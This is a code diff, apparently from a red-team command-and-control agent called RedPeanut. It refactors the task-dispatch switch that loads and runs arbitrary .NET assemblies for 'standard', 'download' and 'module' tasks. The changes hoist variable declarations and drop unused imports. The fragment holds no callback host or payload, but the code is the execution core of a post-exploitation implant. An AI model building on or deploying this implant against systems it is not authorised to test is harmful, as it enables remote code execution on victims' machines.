@@ -4,17 +4,13 @@
 // License: BSD 3-Clause
 //
 
-using RedPeanutAgent.Core;
 using System;
 using System.Diagnostics;
 using System.IO;
 using System.IO.Pipes;
 using System.Net;
 using System.Runtime.InteropServices;
-using System.Security.AccessControl;
 using System.Text;
-using System.Threading;
-using System.Web.Script.Serialization;
 
 namespace RedPeanutAgent.Execution
 {
@@ -98,27 +94,32 @@ namespace RedPeanutAgent.Execution
                 Console.SetOut(sw);
                 Console.SetError(sw);
 
-                switch(task.TaskType)
+                string classname;
+                string assembly;
+                string method;
+                string[] paramsv;
+
+                switch (task.TaskType)
                 {
                     case "standard":
-                        string classname = task.StandardTask.Moduleclass;
-                        string assembly = task.StandardTask.Assembly;
-                        string method = task.StandardTask.Method;
-                        string[] paramsv = task.StandardTask.Parameters;
+                        classname = task.StandardTask.Moduleclass;
+                        assembly = task.StandardTask.Assembly;
+                        method = task.StandardTask.Method;
+                        paramsv = task.StandardTask.Parameters;
                         Utility.RunAssembly(assembly, classname, method, new object[] { paramsv });
                         break;
                     case "download":
-                        string classname = task.DownloadTask.Moduleclass;
-                        string assembly = task.DownloadTask.Assembly;
-                        string method = task.DownloadTask.Method;
-                        string[] paramsv = task.DownloadTask.Parameters;
+                        classname = task.DownloadTask.Moduleclass;
+                        assembly = task.DownloadTask.Assembly;
+                        method = task.DownloadTask.Method;
+                        paramsv = task.DownloadTask.Parameters;
                         Utility.RunAssembly(assembly, classname, method, new object[] { paramsv });
                         break;
                     case "module":
-                        string classname = task.ModuleTask.Moduleclass;
-                        string assembly = task.ModuleTask.Assembly;
-                        string method = task.ModuleTask.Method;
-                        string[] paramsv = task.ModuleTask.Parameters;
+                        classname = task.ModuleTask.Moduleclass;
+                        assembly = task.ModuleTask.Assembly;
+                        method = task.ModuleTask.Method;
+                        paramsv = task.ModuleTask.Parameters;
                         Utility.RunAssembly(assembly, classname, method, new object[] { paramsv });
                         break;
                 }
@@ -242,6 +243,6 @@ namespace RedPeanutAgent.Execution
             return pipename;
 
         }
-        
+
     }
 }
